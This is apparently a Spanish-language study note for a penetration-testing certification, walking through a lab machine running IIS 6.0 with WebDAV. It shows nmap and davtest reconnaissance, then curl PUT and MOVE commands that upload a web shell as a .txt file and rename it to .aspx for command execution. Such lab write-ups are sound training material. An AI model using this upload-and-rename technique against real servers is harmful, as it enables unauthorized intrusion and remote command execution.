#CPTS 

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.95.234 -oG allPorts
```

Encontramos abierto el puerto `80` así que haremos un reconocimiento tan exhaustivo sobre este
```shell
nmap -p80 -sCV -vvv 10.129.95.234 -oN targeted
```

Obtendremos información sobre las tecnologías usadas por la web
```shell
whatweb http://10.129.95.234
```

Con el [[NMAP]] anteriormente usada vemos que hay un *WebDAV* que es un protocolo el cual nos permite guardar, editar, mover y compartir archivos en un servidor web.
También observamos que es un *IIS 6.0* lo cual es una versión bastante desactualizada.
Además en el escaneo de [[NMAP]] ser nos ha descubierto que hay una gran variedad de métodos permitidos  como cabeceras para la comunicación con este como pueden ser `MOVE`, `DELETE`, `COPY`

Usaremos una herramienta llamada [[DAVTEST]] que nos permite verificar que tipo de ficheros podemos subir y cuales no.
```shell
davtest -url http://10.129.60.207
```

Obteniendo como respuesta la permisión de subida de ficheros `.pl`, `.php`, `.html`, `.jsp`, `.cfm`, `.jhtml` y `.txt`

Al ser un *ISS* lo mas critico seria que se nos permitiese subir extensiones como `.aspx` pero en este caso no se nos a acontecido una vulnerabilidad así.

No nos deja subir este tipo de archivos pero esta el método `MOVE` habilitado, lo cual nos puede permitir subir un archivo con una *Web Shell* en un `.txt` con la opción `PUT` y una vez este archivo este cargado dentro del servicio hacer un `MOVE` y transfórmalo en una archivo `.aspx` con nuestra shell.

Subiremos la `aspx_cmd.aspx` con nombre de `aspxcmd.txt` para que no tenganmos problema al subirlo
```shell
curl -s -X PUT http://10.129.60.207/aspxcmd.txt -d @aspx_cmd.aspx
```

Con subirlo así todavía esta *Web Shell* no va a ser interpretada, ahora usaremos la opción `MOVE` para mover el `.txt` y transformarlo en `.aspx` realizando un renombramiento de archivo.
```shell
curl -s -X MOVE -H "Destination:http://10.129.60.207/aspxcmd.aspx" http://10.129.60.207/aspxcmd.txt
```

Hemos usado la cabecera `Destination` para indicar que el archivo `.txt` queremos que sea movido a la misma ubicación bajo el mismo nombre únicamente cambiando la extensión por `.aspx`

Ahora al acceder a esta *Web Shell* a través del navegador vemos que tenemos la capacidad de ejecución de comandos.
![[Pasted image 20260922100219.png]]


